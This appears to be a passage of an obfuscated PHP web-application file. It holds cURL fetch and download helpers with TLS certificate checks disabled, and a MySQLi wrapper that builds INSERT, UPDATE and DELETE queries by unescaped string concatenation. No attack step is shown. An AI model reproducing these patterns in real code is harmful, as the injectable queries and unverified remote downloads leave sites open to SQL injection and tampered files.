    curl_setopt($OOO0000,constant('CURLOPT_AUTOREFERER'),1);
    curl_setopt($OOO0000,constant('CURLOPT_HEADER'),0);
    curl_setopt($OOO0000,constant('CURLOPT_TIMEOUT'),20);
    curl_setopt($OOO0000,constant('CURLOPT_RETURNTRANSFER'),1);
    curl_setopt($OOO0000,constant('CURLOPT_FOLLOWLOCATION'),1);
    curl_setopt($OOO0000,constant('CURLOPT_SSL_VERIFYHOST'),0);
    curl_setopt($OOO0000,constant('CURLOPT_SSL_VERIFYPEER'),0);
    curl_setopt($OOO0000,constant('CURLOPT_ENCODING'),'');
    $OO00O0 = @ curl_exec($OOO0000);
    curl_close($OOO0000);
    return $OO00O0;
}

function isexists($OO000)
{
    $OOO000O = curl_init();
    curl_setopt($OOO000O,constant('CURLOPT_URL'),$OO000);
    curl_setopt($OOO000O,constant('CURLOPT_TIMEOUT'),1);
    curl_setopt($OOO000O,constant('CURLOPT_NOBODY'),1);
    curl_exec($OOO000O);
    $OOO00O0 = curl_getinfo($OOO000O,constant('CURLINFO_HTTP_CODE'));
    if ($OOO00O0 == 404) return false; else return true;
}

function download($OO000, $OO, $OOOO)
{
    $OOO000O = curl_init();
    curl_setopt($OOO000O,constant('CURLOPT_URL'),$OO000);
    curl_setopt($OOO000O,constant('CURLOPT_RETURNTRANSFER'),1);
    curl_setopt($OOO000O,constant('CURLOPT_CONNECTTIMEOUT'),30);
    $OOO0O = curl_exec($OOO000O);
    curl_close($OOO000O);
    $OOO00OO = fopen($OO . $OOOO,'w+');
    fwrite($OOO00OO,$OOO0O);
    fclose($OOO00OO);
    return true;
}

class AppMysqli
{
    var $connection;

    function __construct($OOO0O00, $OOO0O0O, $OOO0OO0, $OOO0OOO = '', $OOOO000, $OOOO00O = 'utf8', $OOOO0O0 = false)
    {
        $this->connection = new mysqli($OOO0O00, $OOO0O0O, $OOO0OO0, $OOO0OOO, $OOOO000);
        if (mysqli_connect_errno()) {
            $this->connection = false;
            header('Content-type: application/json; charset=utf-8');
            die(json_encode(array('msg' => '数据库连接失败')));
        } else {
            $this->connection->set_charset($OOOO00O);
        }
    }

    function chkArray($OOOO0OO, $OOOOO00)
    {
        $OO0OO0 = true;
        if (is_array($OOOO0OO) && is_array($OOOOO00)) {
            if (count($OOOO0OO) != count($OOOOO00)) $OO0OO0 = false;
        } else $OO0OO0 = false;
        return $OO0OO0;
    }

    function sqlMysql($OOOOO0O)
    {
        $OOOOOO0 = @require(vfedpath('path') . 'application/database.php');
        $OOOOO0O = str_replace('{pre}',$OOOOOO0['prefix'],$OOOOO0O);
        return mysqli_query($this->connection,$OOOOO0O);
    }

    function sqlAdded($OOOOOOO, $OO000000, $OO00000O)
    {
        $OOO00 = false;
        if ($this->chkArray($OO000000,$OO00000O)) {
            $OO0000O0 = '';
            $OO0000OO = false;
            foreach ($OO000000 as $OO000O00) {
                if ($OO0000OO) $OO0000O0 .= ',';
                $OO0000O0 .= $OO000O00;
                $OO0000OO = true;
            }
            $OO000O0O = '';
            $OO0000OO = false;
            foreach ($OO00000O as $OO000OO0) {
                if ($OO0000OO) $OO000O0O .= ',';
                $OO000O0O .= '\'' . $OO000OO0 . '\'';
                $OO0000OO = true;
            }
            $OOOOO0O = 'INSERT INTO ' . $OOOOOOO . ' (' . $OO0000O0 . ') VALUES(' . $OO000O0O . ')';
            $OOO00 = $this->sqlMysql($OOOOO0O);
        }
        return $OOO00;
    }

    function sqlDelete($OOOOOOO, $OO000OOO)
    {
        $OOOOO0O = 'DELETE FROM ' . $OOOOOOO . ' WHERE ' . $OO000OOO;
        $OOO00 = $this->sqlMysql($OOOOO0O);
        return $OOO00;
    }

    function sqlUpdate($OOOOOOO, $OO000000, $OO00000O, $OO000OOO)
    {
        $OOO00 = false;
        if ($this->chkArray($OO000000,$OO00000O)) {
            $OO000O0O = '';
            $OO0000OO = false;
            for ($OO00O000 = 0; $OO00O000 < count($OO000000); $OO00O000++) {
                if ($OO0000OO) $OO000O0O .= ',';
                $OO000O0O .= $OO000000[$OO00O000] . '=' . $OO00000O[$OO00O000];
                $OO0000OO = true;
            }
            $OOOOO0O = 'UPDATE ' . $OOOOOOO . ' SET ' . $OO000O0O . ' WHERE ' . $OO000OOO;
            $OOO00 = $this->sqlMysql($OOOOO0O);
        }
        return $OOO00;
    }

    function sqlQuery($OOOOO0O)
    {
        $OO0OO0 = [];
        $OO00O00O = $this->sqlMysql($OOOOO0O);
        while ($OOO00 = mysqli_fetch_array($OO00O00O,constant('MYSQLI_ASSOC'))) $OO0OO0[] = $OOO00;
        return $OO0OO0;
    }
} ?>